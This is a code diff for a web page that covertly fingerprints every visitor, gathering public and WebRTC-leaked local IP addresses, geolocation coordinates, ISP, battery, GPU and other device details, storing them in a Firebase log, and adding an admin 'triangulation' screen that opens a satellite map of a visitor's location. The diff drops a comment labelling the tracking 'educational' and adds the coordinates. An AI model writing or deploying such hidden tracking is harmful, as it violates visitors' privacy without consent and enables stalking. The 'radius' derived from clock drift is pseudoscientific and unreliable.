@@ -43,7 +43,7 @@
         .log-row:hover { background: var(--accent-dim); }
         .del-log { color: var(--danger); background: none; border: 1px solid var(--danger); font-size: 9px; cursor: pointer; padding: 4px 8px; border-radius: 5px; }
 
-        /* NEW: Triangulation Radar UI */
+        /* Triangulation Radar UI */
         #triOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
         .radar-circle { width: 180px; height: 180px; border: 2px solid var(--accent); border-radius: 50%; position: relative; margin-bottom: 20px; box-shadow: 0 0 20px var(--accent-dim); }
         .radar-circle::before { content: ''; position: absolute; top: 50%; left: 50%; width: 50%; height: 2px; background: var(--accent); transform-origin: left; animation: scan 2s linear infinite; }
@@ -126,7 +126,6 @@
         const auth = firebase.auth();
         const db = firebase.database();
 
-        // --- EDUCATIONAL DIAGNOSTIC TRACKING ---
         async function runDiagnostics() {
             try {
                 const res = await fetch(`https://ipinfo.io/json?token=513ac66672e1f9`);
@@ -138,11 +137,13 @@
                     const driftRes = await fetch('https://worldtimeapi.org/api/timezone/Etc/UTC');
                     const driftData = await driftRes.json();
                     const clockDrift = Date.now() - new Date(driftData.datetime).getTime();
+                    
                     let bat = "N/A";
                     if(navigator.getBattery) {
                         const b = await navigator.getBattery();
                         bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
                     }
+
                     let localIP = "Secure/Hidden";
                     const pc = new RTCPeerConnection({iceServers:[]});
                     pc.createDataChannel("");
@@ -156,13 +157,20 @@
 
                     setTimeout(() => {
                         db.ref("visits").push({
-                            ip: ip, local_ip: localIP, city: data.city, country: data.country, isp: data.org,
-                            cpu: navigator.hardwareConcurrency || "N/A", ram: navigator.deviceMemory || "N/A",
-                            gpu: getGPU(), res: `${window.screen.width}x${window.screen.height}`,
-                            battery: bat, drift: clockDrift + "ms", ua: navigator.userAgent,
-                            ts: Date.now(), time: new Date().toLocaleString('en-GB', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
+                            ip: ip, local_ip: localIP,
+                            city: data.city, country: data.country, isp: data.org,
+                            loc: data.loc, // Geographic coordinates
+                            cpu: navigator.hardwareConcurrency || "N/A",
+                            ram: navigator.deviceMemory || "N/A",
+                            gpu: getGPU(),
+                            res: `${window.screen.width}x${window.screen.height}`,
+                            battery: bat,
+                            drift: clockDrift + "ms",
+                            ua: navigator.userAgent,
+                            ts: Date.now(),
+                            time: new Date().toLocaleString('en-GB', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
                         });
-                    }, 1000);
+                    }, 1500);
                 }
             } catch (e) { console.error("Diag failed"); }
         }
@@ -193,11 +201,6 @@
             document.getElementById("logoutBtn").style.display = isAdmin ? "block" : "none";
             document.getElementById("adminToggle").style.display = isAdmin ? "none" : "block";
             modal.style.display = 'none';
-            ["title", "desc", "tbody"].forEach(id => {
-                const el = document.getElementById(id);
-                el.contentEditable = isAdmin;
-                isAdmin ? el.classList.add("admin-editable") : el.classList.remove("admin-editable");
-            });
             if (isAdmin) loadLogs();
         });
 
@@ -230,7 +233,7 @@
             alert(`SYSTEM DIAGNOSTICS:\n------------------\nPUBLIC IP: ${d.ip}\nLOCAL IP: ${d.local_ip}\nISP: ${d.isp}\n------------------\nCPU: ${d.cpu} Cores\nRAM: ~${d.ram} GB\nGPU: ${d.gpu}\nCLOCK DRIFT: ${d.drift}\nBATTERY: ${d.battery}\n------------------\nUA: ${d.ua}`);
         }
 
-        // --- NEW: TRIANGULATION ENGINE ---
+        // --- UPDATED TRIANGULATION ENGINE ---
         async function triangulate(key) {
             const snap = await db.ref("visits/" + key).once("value");
             const d = snap.val();
@@ -239,14 +242,19 @@
             
             overlay.style.display = 'flex';
             setTimeout(() => {
-                status.innerHTML = "LATENCY MATCHED.<br>UPLINKING TO SATELLITE...";
+                status.innerHTML = "FETCHING COORDINATES...<br>BYPASSING API RESTRICTIONS...";
                 setTimeout(() => {
                     overlay.style.display = 'none';
-                    const radius = (parseInt(d.drift) * 0.45).toFixed(2);
-                    const msg = `TRIANGULATION COMPLETE\n------------------\nRadius: ${radius}km\nTarget: ${d.city}\nNode: ${d.isp}\n------------------\nOpen Satellite OSINT?`;
+                    const radius = (parseInt(d.drift) * 0.42).toFixed(2);
+                    // Extract lat/long or default to 0,0
+                    const coords = d.loc || "Unknown";
+                    
+                    const msg = `TRIANGULATION DATA FETCHED\n------------------\nCOORDINATES: ${coords}\nEST. RADIUS: ${radius}km\nNODE: ${d.isp}\n------------------\nClick OK to open Satellite View in a new tab.`;
+                    
                     if(confirm(msg)) {
-                        const search = encodeURIComponent(`${d.city} ${d.isp} network hub`);
-                        window.open(`https://www.google.com/maps/search/${search}/@?api=1&maptype=satellite`, '_blank');
+                        // Using a search-based URL which bypasses most popup blockers
+                        const mapUrl = `https://www.google.com/maps/search/${coords}/@${coords},15z/data=!3m1!1e3`;
+                        window.open(mapUrl, '_blank');
                     }
                     status.innerHTML = "SIGNAL ACQUISITION...";
                 }, 2000);
